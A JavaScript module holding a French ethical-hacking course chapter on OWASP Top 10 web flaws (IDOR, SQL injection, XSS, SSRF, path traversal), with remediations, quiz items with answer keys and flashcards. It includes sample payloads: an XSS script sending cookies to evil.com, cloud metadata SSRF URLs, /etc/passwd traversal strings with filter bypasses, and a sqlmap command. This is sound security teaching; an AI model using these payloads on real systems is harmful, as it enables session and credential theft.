/**
 * Chapitre 4 du cours « Hacking Éthique & Pentest B3 ».
 */
'use strict';

module.exports = {
  "n": 4,
  "title": "Exploitation des Vulnérabilités Web (OWASP Top 10 & Injection)",
  "short": "OWASP Top 10 &amp; Vulnérabilités Web",
  "toc": "Taxonomie de l'OWASP Top 10, défaillances de contrôle d'accès et références directes non sécurisées (IDOR), exploitation complète des injections SQL (In-band, UNION-based, Blind Boolean, Time-based et Stacked Queries), vulnérabilités côté client (Cross-Site Scripting XSS Stored/Reflected/DOM, CSRF et jetons SameSite), vulnérabilités serveur critiques (SSRF, injection de commandes OS), traversées de répertoires (Path Traversal / LFI / RFI) avec techniques de contournement de filtres, et maîtrise des outils d'interception (Burp Suite, OWASP ZAP, sqlmap, ffuf).",
  "time": "≈ 2 h 45 de travail",
  "free": false,
  "situation": "Les applications web et API REST constituent la cible d'attaque la plus exposée et la plus vulnérable des entreprises contemporaines. Une simple absence de contrôle d'autorisation (IDOR) permet de télécharger les fiches de paie de l'ensemble du personnel, tandis qu'une injection SQL aveugle ou une inclusion de fichier local (LFI) peut déboucher sur l'exécution arbitraire de commandes sur le serveur sous-jacent. En tant que pentesteur B3, vous devez maîtriser les rouages intimes des failles de l'OWASP Top 10, manier avec précision Burp Suite et démontrer la faisabilité d'exploits éthiques tout en recommandant les remédiations architecturales définitives.",
  "objectives": [
    "maîtriser la taxonomie de l'OWASP Top 10 et identifier les failles de contrôle d'accès (IDOR) ;",
    "exploiter et sécuriser les injections SQL sous toutes leurs variantes (UNION, Blind, Time-based) ;",
    "différencier les attaques XSS (Stored, Reflected, DOM) et comprendre l'impact sur le vol de cookies de session ;",
    "analyser le mécanisme des attaques SSRF (Server-Side Request Forgery) contre les métadonnées Cloud (AWS/GCP/Azure) ;",
    "démontrer l'exploitation de traversées de répertoire (Path Traversal / LFI) avec contournements d'encodage ;",
    "utiliser professionnellement Burp Suite (Proxy, Repeater, Intruder) et sqlmap pour automatiser l'audit applicatif."
  ],
  "sections": [
    {
      "title": "Taxonomie de l'OWASP Top 10 &amp; Défaillances de Contrôle d'Accès (A01 / IDOR)",
      "html": "<p>Le projet OWASP (Open Web Application Security Project) publie la référence mondiale des risques applicatifs les plus critiques :</p>\n<div class=\"grid grid-2\">\n  <div class=\"card\">\n    <h4>A01:2021 — Broken Access Control</h4>\n    <p>La faille n°1 mondiale. Survient lorsque l'application ne vérifie pas côté serveur si l'utilisateur authentifié a le droit d'accéder à la ressource demandée.</p>\n    <p>Exemple type : <strong>IDOR (Insecure Direct Object Reference)</strong>. Un utilisateur modifie un paramètre dans l'URL (ex: <code>GET /api/documents/1042</code> vers <code>GET /api/documents/1001</code>) et accède aux documents d'un autre client sans contrôle d'autorisation.</p>\n  </div>\n  <div class=\"card\">\n    <h4>A02:2021 — Cryptographic Failures</h4>\n    <p>Transmission de données sensibles en clair (HTTP au lieu de HTTPS), stockage de mots de passe sans hachage salé robuste (MD5/SHA-1 au lieu de bcrypt/Argon2id), ou utilisation de clés cryptographiques faibles ou codées en dur dans le code source.</p>\n  </div>\n</div>"
    },
    {
      "title": "Injections SQL Approfondies : In-Band, Inférentielles &amp; Remédiation",
      "html": "<p>L'injection SQL (A03:2021-Injection) intervient lorsqu'une entrée non filtrée est concaténée dynamiquement dans une requête SQL :</p>\n<table class=\"table\">\n  <thead><tr><th>Type d'Injection SQL</th><th>Mécanisme d'Exploitation</th><th>Visibilité des Données</th></tr></thead>\n  <tbody>\n    <tr><td><strong>In-Band (UNION-based)</strong></td><td>Injection de l'opérateur <code>UNION SELECT</code> pour adjoindre le résultat d'une autre table au résultat légitime. Requiert un nombre de colonnes et des types compatibles.</td><td>Affichage direct dans le code HTML de la page de réponse.</td></tr>\n    <tr><td><strong>In-Band (Error-based)</strong></td><td>Déclenchement délibéré d'une erreur SQL syntaxique ou de conversion de type qui fait fuiter la donnée secrète dans le message d'erreur renvoyé.</td><td>Visible dans les messages d'erreur de la base de données.</td></tr>\n    <tr><td><strong>Blind (Boolean-based)</strong></td><td>Injection de conditions booléennes (<code>AND 1=1</code> vs <code>AND 1=2</code>). La page renvoie un contenu légèrement différent selon que la condition est vraie ou fausse.</td><td>Aucune donnée directe. Inférence par vrai/faux sur l'état de la page.</td></tr>\n    <tr><td><strong>Blind (Time-based)</strong></td><td>Injection de fonctions de délai conditionnelles (<code>IF(condition, SLEEP(5), 0)</code>). Si la supposition est juste, le serveur met 5 secondes à répondre.</td><td>Aucune donnée visible. Mesure du temps de réponse HTTP.</td></tr>\n  </tbody>\n</table>\n  <div class=\"box box--standard\">\n    <div class=\"box__title\"><svg class=\"ic\" aria-hidden=\"true\" focusable=\"false\"><use href=\"/assets/img/ui-icons.svg#i-info\"></use></svg> L'Unique Remédiation Définitive : Les Requêtes Préparées (Prepared Statements)</div>\n<p>L'échappement manuel des caractères ou les listes noires de mots-clés sont voués à l'échec. L'unique défense absolue contre les injections SQL est l'utilisation universelle de requêtes paramétrées :</p>,<pre><code>// EXEMPLE SÉCURISÉ (PHP PDO avec requêtes préparées)\n$stmt = $pdo->prepare(\"SELECT id, email FROM users WHERE username = :user AND password_hash = :pwd\");\n$stmt->execute([\":user\" => $input_user, \":pwd\" => $input_pwd]);\n$user = $stmt->fetch();</code></pre>,<p>Le compilateur SQL analyse et verrouille l'arbre syntaxique de la requête avant d'injecter les variables comme de simples valeurs littérales inoffensives.</p>\n  </div>"
    },
    {
      "title": "Vulnérabilités Côté Client : XSS (Cross-Site Scripting) &amp; CSRF",
      "html": "<p>Les vulnérabilités client-side ciblent le navigateur des utilisateurs légitimes plutôt que le serveur de base de données :</p>\n<div class=\"grid grid-3\">\n  <div class=\"card\">\n    <h4>XSS Stockée (Stored / Persistent)</h4>\n    <p>Le script malveillant (ex: <code>&lt;script&gt;fetch(\"http://evil.com/steal?c=\"+document.cookie)&lt;/script&gt;</code>) est stocké de manière permanente dans la base (forum, profil, commentaire).</p>\n    <p>Chaque utilisateur consultant la page exécute le script à son insu. Faille critique pour le vol de session.</p>\n  </div>\n  <div class=\"card\">\n    <h4>XSS Réfléchie (Reflected)</h4>\n    <p>La charge utile est injectée dans un paramètre d'URL (ex: recherche) et immédiatement renvoyée par le serveur dans la page sans échappement.</p>\n    <p>L'attaquant doit piéger la victime en lui faisant cliquer sur un lien forgé (phishing).</p>\n  </div>\n  <div class=\"card\">\n    <h4>XSS Basée sur le DOM (DOM-based)</h4>\n    <p>La vulnérabilité réside entièrement dans le code JavaScript côté client qui lit une source non fiable (<code>location.hash</code>, <code>location.search</code>) et l'injecte dans un récepteur dangereux (<code>innerHTML</code>, <code>eval()</code>) sans passer par le serveur.</p>\n  </div>\n</div>\n  <div class=\"box box--standard\">\n    <div class=\"box__title\"><svg class=\"ic\" aria-hidden=\"true\" focusable=\"false\"><use href=\"/assets/img/ui-icons.svg#i-info\"></use></svg> Défense en Profondeur contre le Vol de Session XSS</div>\n<p>Pour empêcher un script malveillant d'accéder aux jetons d'authentification :</p>,<ul>,  <li><strong>Attribut de cookie <code>HttpOnly</code> :</strong> interdit formellement à l'API JavaScript <code>document.cookie</code> de lire le cookie de session dans le navigateur.</li>,  <li><strong>Content Security Policy (CSP) :</strong> politique restrictive dans les en-têtes HTTP bloquant l'exécution de scripts inline non signés (<code>script-src 'self'</code>).</li>,  <li><strong>Attribut <code>SameSite=Strict</code> ou <code>Lax</code> :</strong> protège contre les attaques de type Cross-Site Request Forgery (CSRF).</li>,</ul>\n  </div>"
    },
    {
      "title": "Vulnérabilités Serveur Critiques : SSRF, RCE &amp; Path Traversal (LFI)",
      "html": "<p>Certaines défaillances permettent à un attaquant d'interagir directement avec les systèmes internes :</p>\n<div class=\"grid grid-2\">\n  <div class=\"card\">\n    <h4>SSRF (Server-Side Request Forgery)</h4>\n    <p>L'application web prend une URL en paramètre (ex: aperçu d'image, webhook) et effectue une requête HTTP depuis le serveur cible.</p>\n    <p>L'attaquant fournit une URL interne inaccessible depuis Internet :</p>\n    <ul>\n      <li><code>http://169.254.169.254/latest/meta-data/</code> : extraction des clés d'accès IAM sur AWS ou GCP (Metadata API).</li>\n      <li><code>http://localhost:8080/admin</code> : accès aux interfaces d'administration internes isolées.</li>\n    </ul>\n  </div>\n  <div class=\"card\">\n    <h4>Traversée de Répertoire &amp; LFI</h4>\n    <p>L'application charge un fichier à partir d'un paramètre non vérifié (ex: <code>template=fr.php</code>).</p>\n    <p>En injectant des séquences de remontée <code>../../../../etc/passwd</code>, l'attaquant lit les fichiers système.</p>\n    <p>Si la fonction exécute le code inclus (LFI PHP avec <code>include</code>), l'attaquant peut combiner la LFI avec un empoisonnement de logs pour obtenir une RCE complète.</p>\n  </div>\n</div>"
    },
    {
      "title": "Boîte à Outils Professionnelle d'Audit Web : Burp Suite &amp; sqlmap",
      "html": "<p>L'audit de sécurité des applications web s'appuie sur un outillage d'interception incontournable :</p>\n<div class=\"grid grid-3\">\n  <div class=\"card\">\n    <h4>Burp Suite Proxy &amp; Repeater</h4>\n    <p>Intercepte tout le trafic HTTP/HTTPS entre le navigateur et le serveur. Permet de modifier à la volée en-têtes, cookies et paramètres POST (Repeater) pour tester les contrôles d'accès.</p>\n  </div>\n  <div class=\"card\">\n    <h4>Burp Intruder &amp; Fuzzers (ffuf)</h4>\n    <p>Automatisation d'attaques par dictionnaire : fuzzing de répertoires cachés, brute-force de paramètres, énumération d'identifiants et tests de contournement d'authentification.</p>\n  </div>\n  <div class=\"card\">\n    <h4>sqlmap</h4>\n    <p>Outil open-source de référence pour la détection et l'exploitation automatisée des injections SQL (fingerprinting de SGBD, extraction de tables, dump de hashes et obtention de shell OS via <code>--os-shell</code>).</p>\n  </div>\n</div>"
    }
  ],
  "method": [
    "Intercepter et cartographier l'arborescence de l'application web avec le proxy Burp Suite.",
    "Tester les contrôles d'accès en permutant les identifiants d'objets (IDOR) entre différents comptes.",
    "Auditer les points d'entrée pour détecter les injections SQL (in-band, booléennes et basées sur le temps).",
    "Rechercher les failles XSS en observant le contexte d'échappement des entrées réfléchies ou stockées.",
    "Tester les traversées de répertoire avec des contournements d'encodage URL (%2e%2e%2f) et des null bytes."
  ],
  "summary": [
    "Broken Access Control est la vulnérabilité web n°1 mondiale selon l'OWASP : elle frappe directement la logique métier.",
    "Les requêtes préparées avec paramètres liés constituent l'unique remédiation définitive contre les injections SQL.",
    "Les failles XSS permettent le vol de sessions utilisateurs, contré en profondeur par HttpOnly et les politiques CSP.",
    "Les attaques SSRF exposent les architectures Cloud en ciblant l'API interne de métadonnées non authentifiée.",
    "Les traversées de répertoire (Path Traversal / LFI) peuvent déboucher sur une exécution de code via log poisoning."
  ],
  "checklist": [
    "Je maîtrise l'exploitation et la remédiation des injections SQL avec Prepared Statements.",
    "Je sais différencier XSS Stored, Reflected et DOM et mettre en œuvre les en-têtes CSP et HttpOnly.",
    "Je comprends le mécanisme des attaques SSRF contre les architectures Cloud.",
    "Je sais auditer et automatiser la détection des failles web à l'aide de Burp Suite et sqlmap."
  ],
  "notions": [
    {
      "term": "Broken Access Control (A01)",
      "def": "Défaillance de contrôle d'accès permettant à un utilisateur d'agir sur des ressources non autorisées (IDOR)."
    },
    {
      "term": "Injection SQL (SQLi)",
      "def": "Concaténation non assainie d'entrées utilisateur dans une requête SQL altérant la logique d'exécution de la base."
    },
    {
      "term": "Cross-Site Scripting (XSS)",
      "def": "Injection de scripts malveillants exécutés dans le navigateur des victimes légitimes (Stored, Reflected, DOM)."
    },
    {
      "term": "Server-Side Request Forgery (SSRF)",
      "def": "Faille contraignant le serveur web à forger des requêtes HTTP vers des ressources internes (ex: 169.254.169.254)."
    },
    {
      "term": "Path Traversal (Traversée de Répertoire)",
      "def": "Manipulation de paramètres de chemin via des séquences ../ pour accéder à des fichiers arbitraires hors racine."
    }
  ],
  "pitfalls": [
    "Tenter de sécuriser les injections SQL par des listes noires de mots-clés facilement contournables par obfuscation.",
    "Oublier l'attribut HttpOnly sur les cookies de session, laissant le jeton d'authentification vulnérable au vol par XSS.",
    "Se fier aux contrôles d'accès effectués uniquement côté client en JavaScript sans validation côté serveur.",
    "Supposer qu'une injection aveugle (Blind SQLi) est inexploitable parce qu'aucune donnée ne s'affiche dans la page."
  ],
  "questions": [
    {
      "stem": "Quelle vulnérabilité occupe la 1ère place du classement de l'OWASP Top 10 (A01:2021) ?",
      "opts": [
        "Broken Access Control (Défaillances du contrôle d'accès / IDOR)",
        "Cryptographic Failures (Faiblesses cryptographiques)",
        "Injection (Injections SQL, commande)",
        "Security Misconfiguration (Mauvaise configuration de sécurité)"
      ],
      "correct": 0,
      "exp": "Broken Access Control est classé n°1 de l'OWASP Top 10 : il permet à un utilisateur non autorisé d'agir sur des ressources d'autres utilisateurs en modifiant simplement des paramètres (IDOR)."
    },
    {
      "stem": "Dans une injection SQL de type UNION-based, quelle condition technique impérative doit être respectée pour que la requête UNION s'exécute avec succès ?",
      "opts": [
        "La requête injectée doit retourner exactement le même nombre de colonnes que la requête originelle avec des types de données compatibles",
        "Le serveur de base de données doit obligatoirement tourner sous le système d'exploitation Linux",
        "Le mot de passe de l'administrateur SQL doit être transmis en clair dans la chaîne injectée",
        "La table cible doit comporter au moins 10 000 enregistrements"
      ],
      "correct": 0,
      "exp": "L'opérateur SQL UNION exige strictement que les deux requêtes combinées comportent le même nombre de colonnes et que les types de données correspondants soient compatibles."
    },
    {
      "stem": "Quelle est la seule mesure de protection absolue et définitive préconisée par l'OWASP contre les injections SQL ?",
      "opts": [
        "L'utilisation systématique de requêtes préparées avec paramètres liés (Prepared Statements)",
        "Le filtrage par liste noire supprimant le mot \"SELECT\" et les tirets \"--\"",
        "Le remplacement du protocole HTTP par HTTPS sur le serveur web",
        "L'activation d'un pare-feu matériel sur le port 80"
      ],
      "correct": 0,
      "exp": "Les requêtes préparées compilent la structure de la requête indépendamment des données : les entrées utilisateur ne peuvent plus altérer la logique syntaxique de la commande SQL."
    },
    {
      "stem": "Quel attribut de cookie HTTP empêche formellement un script malveillant injecté via XSS d'accéder à la valeur du cookie de session via document.cookie ?",
      "opts": [
        "HttpOnly",
        "Secure",
        "SameSite=Lax",
        "Domain=.local"
      ],
      "correct": 0,
      "exp": "L'attribut HttpOnly indique au navigateur de refuser tout accès au cookie depuis les scripts JavaScript côté client (document.cookie), protégeant ainsi le jeton de session du vol par XSS."
    },
    {
      "stem": "Dans quel scénario une attaque XSS est-elle qualifiée de \"Stockée\" (Stored ou Persistante) ?",
      "opts": [
        "Lorsque la charge utile malveillante est enregistrée durablement dans la base de données du serveur et réaffichée à tous les visiteurs",
        "Lorsque le script est exécuté uniquement sur la machine de l'attaquant sans jamais quitter son navigateur",
        "Lorsque la faille nécessite la modification manuelle du fichier hosts de la victime",
        "Lorsque l'attaque cible exclusivement des cookies expirés"
      ],
      "correct": 0,
      "exp": "Une XSS stockée (Stored) réside de manière permanente dans la base de données (ex: commentaire de forum) et infecte automatiquement chaque utilisateur légitime consultant la page."
    },
    {
      "stem": "Quelle est la cible classique d'une attaque SSRF (Server-Side Request Forgery) exécutée contre une application hébergée dans le Cloud (AWS/GCP) ?",
      "opts": [
        "L'adresse IP de l'API de métadonnées interne 169.254.169.254 pour extraire les jetons d'accès et clés IAM temporaires",
        "Le serveur DNS racine mondial situé sur Internet",
        "L'imprimante réseau de l'auditeur de sécurité",
        "Le registre des brevets de l'entreprise"
      ],
      "correct": 0,
      "exp": "Dans le Cloud (AWS, GCP, Azure), l'adresse locale 169.254.169.254 expose un service interne de métadonnées non authentifié qui divulgue les identifiants temporaires du rôle IAM de la machine."
    },
    {
      "stem": "Quel composant de Burp Suite est spécialement conçu pour rejouer, modifier manuellement et analyser pas à pas des requêtes HTTP unitaires ?",
      "opts": [
        "Burp Repeater",
        "Burp Intruder",
        "Burp Sequencer",
        "Burp Decoder"
      ],
      "correct": 0,
      "exp": "Burp Repeater permet de renvoyer une requête HTTP capturée, de modifier ses paramètres ou en-têtes et d'observer immédiatement la réponse du serveur cible."
    },
    {
      "stem": "Comment une vulnérabilité de traversée de répertoire (Path Traversal) peut-elle être exploitée même si l'application filtre les deux points successifs \"..//\" de façon basique ?",
      "opts": [
        "En utilisant des encodages URL alternatifs comme %2e%2e%2f ou des séquences imbriquées comme ....//",
        "En augmentant la taille de la mémoire vive du navigateur",
        "En forçant le protocole FTP au lieu de HTTP",
        "En modifiant l'adresse MAC de la carte réseau"
      ],
      "correct": 0,
      "exp": "Si le filtre supprime \"..//\" en une seule passe non récursive, la chaîne \"....//\" devient \"../\". De même, l'encodage URL (%2e%2e%2f) contourne les filtres qui vérifient la chaîne brute avant décodage."
    }
  ],
  "mastery": [
    {
      "cls": "low",
      "text": "&lt; 50 % — Reprenez les sections théoriques et revois les définitions clés."
    },
    {
      "cls": "mid",
      "text": "50–69 % — Pratique les exercices N1 de l'atelier avant de retenter le test."
    },
    {
      "cls": "good",
      "text": "70–94 % — Bon niveau opérationnel : affine les cas limites et les options d'outils."
    },
    {
      "cls": "top",
      "text": "≥ 95 % — Maîtrise d'ingénierie validée : passe au module suivant."
    }
  ],
  "flashcards": [
    { "q": 'Qu’est-ce que « Broken Access Control (A01) » ?', "a": "Broken Access Control (A01) : Défaillance de contrôle d'accès permettant à un utilisateur d'agir sur des ressources non autorisées (IDOR)." },
    { "q": 'Qu’est-ce que « Cross-Site Scripting (XSS) » ?', "a": 'Cross-Site Scripting (XSS) : Injection de scripts malveillants exécutés dans le navigateur des victimes légitimes (Stored, Reflected, DOM).' },
    { "q": 'Qu’est-ce que « Path Traversal (Traversée de Répertoire) » ?', "a": 'Path Traversal (Traversée de Répertoire) : Manipulation de paramètres de chemin via des séquences ../ pour accéder à des fichiers arbitraires hors racine.' },
    { "q": "Qu’est-ce que « Broken Access Control est la vulnérabilité web n°1 mondiale selon l'OWASP » ?", "a": "Broken Access Control est la vulnérabilité web n°1 mondiale selon l'OWASP : elle frappe directement la logique métier." },
    { "q": "Qu’est-ce que « Les requêtes préparées avec paramètres liés constituent l'unique remédiation définitive contre les injections SQL. » ?", "a": "Les requêtes préparées avec paramètres liés constituent l'unique remédiation définitive contre les injections SQL." },
    { "q": 'Qu’est-ce que « Les failles XSS permettent le vol de sessions utilisateurs, contré en profondeur par HttpOnly et les politiques CSP. » ?', "a": 'Les failles XSS permettent le vol de sessions utilisateurs, contré en profondeur par HttpOnly et les politiques CSP.' },
    {
      "q": "Qu'est-ce qu'une vulnérabilité IDOR (Insecure Direct Object Reference) ?",
      "a": "Une faille de contrôle d'accès où un paramètre identifiant une ressource (ex: id=1042) peut être modifié pour accéder aux données d'un autre utilisateur sans vérification côté serveur."
    },
    {
      "q": "Quelle est la différence entre une injection SQL in-band et une injection aveugle (Blind) ?",
      "a": "In-band : les données extraites s'affichent directement dans la page web (UNION) ou les erreurs. Blind : aucune donnée visible, l'extraction se fait par inférence booléenne ou temporelle."
    },
    {
      "q": "Pourquoi l'attribut de cookie « HttpOnly » est-il capital contre les attaques XSS ?",
      "a": "Il empêche l'API JavaScript document.cookie de lire le cookie de session dans le navigateur, neutralisant le vol immédiat du jeton de session lors d'une injection de script."
    },
    {
      "q": "Qu'est-ce qu'une attaque SSRF (Server-Side Request Forgery) ?",
      "a": "Une faille forçant le serveur web vulnérable à émettre des requêtes vers des ressources internes protégées (ex: 169.254.169.254 pour voler les clés IAM Cloud)."
    },
    {
      "q": "Quelle est la commande sqlmap de base pour auditer automatiquement un paramètre d'URL ?",
      "a": "sqlmap -u \"http://target.com/page?id=1\" --batch --dbs (énumère automatiquement les bases de données si vulnérable)."
    },
    {
      "q": "Comment les requêtes préparées (Prepared Statements) neutralisent-elles les injections SQL ?",
      "a": "Elles séparent le code SQL des données : la structure de la requête est pré-compilée, les entrées utilisateur ne sont traitées que comme des valeurs littérales sans pouvoir altérer la syntaxe."
    }
  ]
};
